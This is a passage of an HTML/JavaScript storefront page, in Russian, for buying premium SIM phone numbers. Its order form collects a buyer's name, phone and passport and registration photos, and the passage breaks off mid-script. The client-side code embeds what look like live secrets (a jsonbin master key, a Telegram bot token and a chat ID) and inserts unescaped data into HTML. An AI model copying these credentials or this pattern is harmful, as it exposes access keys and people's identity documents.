<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIM MARKET | DIGITAL MOTION</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;900&family=JetBrains+Mono:wght@400;800&display=swap');
        
        body { background: #010204; color: #a1a1aa; font-family: 'Inter', sans-serif; overflow-x: hidden; position: relative; }
        
        /* Динамический фон */
        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(circle at 20% 80%, rgba(251, 191, 36, 0.03), transparent 40%), radial-gradient(circle at 80% 20%, rgba(251, 191, 36, 0.02), transparent 40%); z-index: -1; }
        .bg-shape { position: fixed; border-radius: 50%; background: rgba(251, 191, 36, 0.01); backdrop-filter: blur(50px); z-index: -2; animation: floatShapes 20s infinite linear; }
        @keyframes floatShapes { from { transform: translate(0, 0) rotate(0deg); } to { transform: translate(100px, 100px) rotate(360deg); } }

        .glass-header { background: rgba(1, 2, 4, 0.85); backdrop-filter: blur(20px); border-b: 1px solid rgba(255, 255, 255, 0.03); }
        
        .gold-gradient { background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; transition: 0.3s; }
        
        .gold-btn { background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%); color: #000; font-weight: 900; position: relative; overflow: hidden; transition: 0.3s; }
        .gold-btn::after { content: ''; position: absolute; inset: 0; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transform: translateX(-100%); transition: 0.5s; }
        .gold-btn:hover::after { transform: translateX(100%); }

        /* Анимация появления */
        .card-anim { animation: rollIn 0.8s ease forwards; opacity: 0; transform-origin: center; }
        @keyframes rollIn { 0% { opacity: 0; transform: scale(0.8) translateY(20px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }

        /* Эффект полета кометы для VIP */
        .vip-neon { position: relative; border: 1px solid rgba(251, 191, 36, 0.1); box-shadow: 0 0 15px rgba(251, 191, 36, 0.02); transition: 0.3s; }
        .vip-neon::after { content: ''; position: absolute; inset: -2px; border: 2px solid transparent; border-top-color: #fbbf24; border-radius: 2.5rem; opacity: 0; transition: 0.5s; animation: cometRun 2s infinite linear; animation-play-state: paused; }
        .vip-neon:hover::after, .vip-neon:active::after { opacity: 1; animation-play-state: running; }
        @keyframes cometRun { 0% { clip-path: inset(0 100% 100% 0); } 25% { clip-path: inset(0 0 100% 0); } 50% { clip-path: inset(0 0 0 0); } 75% { clip-path: inset(100% 0 0 0); } 100% { clip-path: inset(100% 100% 0 0); } }

        /* Магнитный эффект */
        .magnetic { transition: transform 0.2s ease-out; }

        .search-dark { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
        .search-dark:focus { border-color: #fbbf24; background: rgba(255,255,255,0.05); box-shadow: 0 0 15px rgba(251, 191, 36, 0.05); }
        
        .tab-text { font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; position: relative; }
        .tab-text::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #fbbf24; transition: 0.3s; }
        .tab-active { color: #fbbf24; }
        .tab-active::after { width: 100%; }
        
        .font-num { font-family: 'JetBrains Mono', monospace; letter-spacing: -1.5px; }

        /* Кнопка Lucky Sim */
        .lucky-btn { transition: 0.3s; filter: grayscale(1); opacity: 0.5; }
        .lucky-btn:hover { filter: grayscale(0); opacity: 1; transform: rotate(15deg) scale(1.1); }
    </style>
</head>
<body class="pb-24">

    <div class="bg-shape" style="width: 200px; height: 200px; top: 10%; left: -50px; animation-duration: 25s;"></div>
    <div class="bg-shape" style="width: 150px; height: 150px; bottom: 15%; right: -30px; animation-delay: -5s;"></div>

    <header class="p-8 text-center sticky top-0 z-50 glass-header flex justify-between items-center">
        <div class="w-10"></div> <div>
            <h1 class="text-4xl font-black gold-gradient tracking-tighter uppercase leading-none mb-1 group cursor-pointer">
                <span class="inline-block hover:animate-bounce">S</span>IM MARKET
            </h1>
            <p class="text-[9px] font-bold text-gray-600 tracking-[0.5em] uppercase">Digital Assets • DAG</p>
        </div>
        <button onclick="luckySim()" class="lucky-btn text-2xl p-2 rounded-full glass-header border border-white/5" title="Счастливый случай">🎲</button>
    </header>

    <main class="max-w-2xl mx-auto p-4">
        
        <section class="mt-8 mb-10 space-y-5">
            <input type="text" id="mainSearch" oninput="applyFilters()" placeholder="ПОИСК (НАПР. 000 ИЛИ МЕГАФОН)" 
                   class="w-full p-5 rounded-[1.5rem] search-dark text-white outline-none font-medium text-xs tracking-widest uppercase magnetic">
            
            <div class="flex gap-4 overflow-x-auto pb-2 border-b border-white/5 no-scrollbar">
                <button onclick="setTab('all')" id="tab-all" class="tab-text tab-active py-2 whitespace-nowrap">Все</button>
                <button onclick="setTab('vip')" id="tab-vip" class="tab-text py-2 whitespace-nowrap text-gray-600">VIP & GOLD</button>
                <button onclick="setTab('megafon')" id="tab-megafon" class="tab-text py-2 whitespace-nowrap text-gray-600">Мегафон</button>
                <button onclick="setTab('beeline')" id="tab-beeline" class="tab-text py-2 whitespace-nowrap text-gray-600">Билайн</button>
            </div>
        </section>

        <div id="displayGrid" class="space-y-4">
            <div class="text-center p-20 opacity-10 text-[9px] font-black uppercase tracking-[0.3em]">Синхронизация движения...</div>
        </div>
    </main>

    <div id="orderModal" style="display:none;" class="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-xl">
        <div class="p-8 rounded-[3rem] w-full max-w-sm border border-white/10 bg-[#010204] card-anim">
            <h2 class="text-2xl font-black mb-1 gold-gradient uppercase tracking-tighter">Оформление</h2>
            <p id="targetNum" class="text-lg font-num font-bold text-white mb-6 border-b border-white/5 pb-2"></p>
            
            <form id="orderForm" class="space-y-4">
                <input type="text" id="userName" placeholder="ВАШЕ ФИО" class="w-full search-dark p-4 rounded-xl border border-white/5 outline-none focus:border-yellow-600 text-white text-xs" required>
                <input type="tel" id="userPhone" placeholder="ТЕЛЕФОН" class="w-full search-dark p-4 rounded-xl border border-white/5 outline-none focus:border-yellow-600 text-white text-xs" required>
                
                <div class="grid grid-cols-2 gap-3">
                    <div class="p-3 bg-white/3 rounded-xl border border-white/5 text-center">
                        <label class="text-[7px] text-gray-600 block mb-2 uppercase font-black tracking-widest">ПАСПОРТ (ЛИЦО)</label>
                        <input type="file" id="pass1" accept="image/*" class="text-[8px] text-gray-500" required>
                    </div>
                    <div class="p-3 bg-white/3 rounded-xl border border-white/5 text-center">
                        <label class="text-[7px] text-gray-600 block mb-2 uppercase font-black tracking-widest">ПРОПИСКА</label>
                        <input type="file" id="pass2" accept="image/*" class="text-[8px] text-gray-500" required>
                    </div>
                </div>

                <button type="submit" id="submitOrder" class="w-full gold-btn text-black font-black py-5 rounded-2xl uppercase tracking-widest mt-2 magnetic">Оформить актив</button>
                <button type="button" onclick="closeOrder()" class="w-full text-gray-700 text-[9px] font-bold uppercase py-2 tracking-widest active:scale-95 transition-all">Назад</button>
            </form>
        </div>
    </div>

    <script>
        const BIN_ID = "69c9d640aaba882197a65742"; 
        const MASTER_KEY = "$2a$10$BIVZfOXmYVaG9NpPRW61Le//5yePRuieGl/ph3o6UYlHw4uOJQKtW"; 
        const TG_TOKEN = "8569235049:AAEsaW4ME-Ql6036i04tIbj--IPNT6JdroE"; 
        const TG_CHAT = "8768514374"; 

        let allData = [];
        let currentTab = 'all';

        async function init() {
            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { 'X-Master-Key': MASTER_KEY }
                });
                const data = await res.json();
                allData = data.record || [];
                applyFilters();
                initMagnetic(); // Запускаем магнитный эффект
            } catch (err) { console.error("Network Error"); }
        }

        function setTab(tab) {
            currentTab = tab;
            document.querySelectorAll('.tab-text').forEach(b => b.classList.remove('tab-active', 'text-yellow-500'));
            document.querySelectorAll('.tab-text').forEach(b => b.classList.add('text-gray-600'));
            document.getElementById('tab-' + tab).classList.add('tab-active', 'text-yellow-500');
            applyFilters();
        }

        function applyFilters(luckyItem = null) {
            const grid = document.getElementById('displayGrid');
            const searchVal = document.getElementById('mainSearch').value.toLowerCase();
            
            let filtered = luckyItem ? [luckyItem] : allData.filter(i => i.n.includes(searchVal) || (i.o && i.o.toLowerCase().includes(searchVal)));

            if(!luckyItem) {
                if(currentTab === 'vip') filtered = filtered.filter(i => i.cat === 'vip' || i.cat === 'gold');
                else if(currentTab !== 'all') filtered = filtered.filter(i => i.op === currentTab);
            }

            grid.innerHTML = filtered.map((item, idx) => {
                const isVip = item.cat === 'vip' || item.cat === 'gold';
                return `
                <div onclick="openOrder('${item.n}')" class="p-6 rounded-[2.5rem] flex justify-between items-center cursor-pointer card-anim border border-white/5 hover:border-yellow-600/30 transition-all magnetic ${isVip ? 'vip-neon' : ''}" style="animation-delay: ${idx * 0.03}s">
                    <div>
                        <div class="flex items-center gap-3">
                            <span class="text-3xl font-black font-num tracking-tighter text-white leading-none">${item.n}</span>
                            ${isVip ? `<span class="bg-yellow-600 text-black text-[7px] px-2 py-0.5 rounded font-black uppercase tracking-widest">${item.cat}</span>` : ''}
                        </div>
                        <div class="text-[9px] font-bold text-gray-700 uppercase mt-2 tracking-widest">
                            ${item.o || item.op} • <span class="text-yellow-600/80">${item.tarif || 'Базовый'}</span> (${item.tarif_p || 0}₽)
                        </div>
                    </div>
                    <div class="text-right flex items-center gap-3">
                        <div class="text-xl font-black font-num text-yellow-500 tracking-tighter">${item.t}₽</div>
                        <div class="text-xs text-gray-700 active:scale-125 transition-all">→</div>
                    </div>
                </div>
            `}).reverse().join('');
        }

        // Функция "Счастливый случай"
        function luckySim() {
            const premiumNumbers = allData.filter(i => i.cat === 'vip' || i.cat === 'gold');
            if(premiumNumbers.length === 0) return alert("VIP номеров пока нет");
            const randomItem = premiumNumbers[Math.floor(Math.random() * premiumNumbers.length)];
            
            // Сбрасываем фильтры и поиск
            document.getElementById('mainSearch').value = '';
            setTab('all');
            
            // Показываем один номер
            applyFilters(randomItem);
            
            // Всплывающее уведомление
            alert("🎲 Счастливый случай! Мы подобрали для вас номер: " + randomItem.n);
        }

        function openOrder(num) {
            document.getElementById('targetNum').innerText = num;
            document.getElementById('orderModal').style.display = 'flex';
        }

        function closeOrder() { document.getElementById('orderModal').style.display = 'none'; }

        // Реализация магнитного эффекта
        function initMagnetic() {
            const magnetics = document.querySelectorAll('.magnetic');
            magnetics.forEach(elem => {
                elem.addEventListener('mousemove', e => {
                    const pos = elem.getBoundingClientRect();
                    const mx = e.clientX - pos.left - pos.width/2;
                    const my = e.clientY - pos
